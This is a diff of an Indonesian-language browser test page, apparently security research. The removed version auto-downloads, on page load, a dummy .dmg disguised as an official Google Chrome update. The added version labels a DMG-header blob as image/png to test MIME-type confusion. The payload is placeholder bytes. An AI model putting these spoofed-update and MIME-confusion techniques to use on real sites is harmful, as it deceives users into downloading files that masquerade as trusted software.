@@ -1,108 +1,101 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Google Trusted Download Spoofing</title>
-<style>
-* { box-sizing: border-box; margin: 0; padding: 0; }
-body { font-family: 'Segoe UI', Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
-.panel { background: #ffffff; padding: 24px; border-radius: 12px; box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1); max-width: 600px; margin: 40px auto; text-align: center; }
-:fullscreen { background: #111111 !important; color: #00ff00 !important; padding: 20px !important; overflow-y: auto !important; width: 100vw !important; height: 100vh !important; }
-:-webkit-full-screen { background: #111111 !important; color: #00ff00 !important; padding: 20px !important; overflow-y: auto !important; }
-h2 { margin-bottom: 10px; }
-p { margin-bottom: 15px; line-height: 1.5; }
-button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 6px; background: #0078d4; color: #ffffff; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(0, 120, 212, 0.3); transition: background 0.2s; margin-bottom: 10px; }
-button:hover { background: #005a9e; }
-#status { margin-top: 16px; font-weight: bold; color: #d32f2f; padding: 12px; background: #ffebee; border-radius: 6px; text-align: center; border: 1px solid #ffcdd2; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>MIME-Type Confusion Bypass</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
+        .panel { background: #ffffff; padding: 24px; border-radius: 12px; box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1); max-width: 600px; margin: 40px auto; }
+        h2 { margin-bottom: 10px; }
+        p { margin-bottom: 15px; line-height: 1.5; }
+        button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 6px; background: #d32f2f; color: #ffffff; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3); transition: background 0.2s; }
+        button:hover { background: #b71c1c; }
+        #status { margin-top: 16px; font-weight: bold; color: #d32f2f; padding: 12px; background: #ffebee; border-radius: 6px; text-align: center; border: 1px solid #ffcdd2; }
+    </style>
 </head>
 
 <body>
 <div class="panel" id="main-panel">
-    <h2>Google Trusted Download Spoofing</h2>
-    <p>Memicu unduhan file 18MB yang disamarkan seolah-olah berasal dari Google.</p>
-
-    <button id="start-btn" type="button">Mulai Unduh (Spoofed)</button>
+    <h2>MIME-Type Confusion Bypass</h2>
+    <p>Menguji apakah browser menyimpan file .dmg sebagai gambar (image/png) karena manipulasi MIME Type.</p>
+    
+    <button id="start-btn" type="button">Mulai Uji Confusion</button>
     <div id="status" role="status">Sistem siap.</div>
 </div>
 
 <script>
-const startBtn = document.getElementById("start-btn");
-const statusDiv = document.getElementById("status");
+    const startBtn = document.getElementById("start-btn");
+    const statusDiv = document.getElementById("status");
 
-const speak = (message) => {
-    if ('speechSynthesis' in window) {
-        window.speechSynthesis.cancel();
-        const utterance = new SpeechSynthesisUtterance(message);
-        utterance.lang = 'id-ID';
-        utterance.rate = 1.0;
-        window.speechSynthesis.speak(utterance);
-    }
-};
+    const speak = (message) => {
+        if ('speechSynthesis' in window) {
+            window.speechSynthesis.cancel();
+            const utterance = new SpeechSynthesisUtterance(message);
+            utterance.lang = 'id-ID';
+            window.speechSynthesis.speak(utterance);
+        }
+    };
 
-// Membuat file 18MB dengan header DMG (koly)
-const prepareMimeBlobAsync = (i) => {
-    return new Promise((resolve) => {
-        queueMicrotask(() => {
-            const sizeInMB = 18;
-            const sizeInBytes = sizeInMB * 1024 * 1024;
+    const prepareConfusionBlobAsync = (i) => {
+        return new Promise((resolve) => {
+            queueMicrotask(() => {
+                // 1. Buat data biner DMG (Header 'koly' + 18MB dummy)
+                const sizeInBytes = 18 * 1024 * 1024; // 18 MB
+                const bytes = new Uint8Array(sizeInBytes);
+                
+                // Magic bytes DMG: 6B 6F 6C 79 ('koly')
+                bytes[0] = 0x6B; // k
+                bytes[1] = 0x6F; // o
+                bytes[2] = 0x6C; // l
+                bytes[3] = 0x79; // y
 
-            const bytes = new Uint8Array(sizeInBytes);
-            bytes[0] = 0x6B; // k
-            bytes[1] = 0x6F; // o
-            bytes[2] = 0x6C; // l
-            bytes[3] = 0x79; // y
-
-            const blob = new Blob([bytes], { type: 'application/octet-stream' });
-            const url = URL.createObjectURL(blob);
-            
-            resolve({ id: i, url: url });
+                // 2. TRIK: Deklarasikan sebagai image/png (bukan application/octet-stream)
+                // Browser akan mengira ini file gambar.
+                const blob = new Blob([bytes], { type: 'image/png' });
+                const url = URL.createObjectURL(blob);
+                
+                resolve({ id: i, url: url });
+            });
         });
-    });
-};
+    };
 
-const triggerInstantDownload = (fileData) => {
-    const link = document.createElement("a");
-    link.href = fileData.url;
-    
-    // UI SPOOFING: Menyamar sebagai file dari Google
-    // Nama file dibuat seolah-olah itu file resmi dari Google
-    link.download = `Google_Chrome_Update_${fileData.id}.dmg`;
-    
-    link.style.display = "none";
-    document.body.appendChild(link);
-    link.click();
-    
-    // Cleanup
-    setTimeout(() => {
-        if (link.parentNode) link.parentNode.removeChild(link);
-        URL.revokeObjectURL(fileData.url);
-    }, 5000);
-};
-
-// DRIVE-BY EXECUTION: Picu otomatis saat halaman dimuat
-window.addEventListener('load', async () => {
-    statusDiv.textContent = "Memeriksa pembaruan Google...";
-    speak("Memulai pembaruan Google.");
-    
-    try {
-        // Tampilkan UI palsu (Fake Notification)
-        setTimeout(() => {
-            statusDiv.textContent = "Mengunduh pembaruan Google Chrome resmi...";
-            statusDiv.style.color = '#0078d4';
-        }, 500);
-
-        const fileData = await prepareMimeBlobAsync(1);
-        triggerInstantDownload(fileData);
+    const triggerInstantDownload = (fileData) => {
+        const link = document.createElement("a");
+        link.href = fileData.url;
         
-        statusDiv.textContent = "Unduhan pembaruan Google Chrome berhasil dipicu!";
-        statusDiv.style.color = '#4CAF50';
-    } catch(e) {
-        statusDiv.textContent = "Gagal: " + e.message;
-        statusDiv.style.color = '#f00';
-    }
-});
+        // 3. Nama file tetap .dmg (macOS Disk Image)
+        link.download = `Confusion_Update_${fileData.id}.dmg`;
+        
+        link.textContent = `Blob #${fileData.id} (.dmg)`;
+        link.style.display = "none";
+        document.body.appendChild(link);
+        link.click();
+        
+        setTimeout(() => {
+            if (link.parentNode) link.parentNode.removeChild(link);
+            URL.revokeObjectURL(fileData.url);
+        }, 5000);
+    };
+
+    startBtn.addEventListener("click", async () => {
+        startBtn.disabled = true;
+        statusDiv.textContent = "Membuat file biner (18MB) dengan MIME Type palsu...";
+        speak("Memulai manipulasi MIME Confusion.");
+
+        try {
+            const fileData = await prepareConfusionBlobAsync(1);
+            triggerInstantDownload(fileData);
+            
+            statusDiv.textContent = "Unduhan dipicu! File .dmg (MIME: image/png) sedang diunduh.";
+            statusDiv.style.color = "#4CAF50";
+        } catch (e) {
+            statusDiv.textContent = "Gagal: " + e.message;
+            statusDiv.style.color = "#f00";
+        }
+        startBtn.disabled = false;
+    });
 </script>
 </body>
 </html>
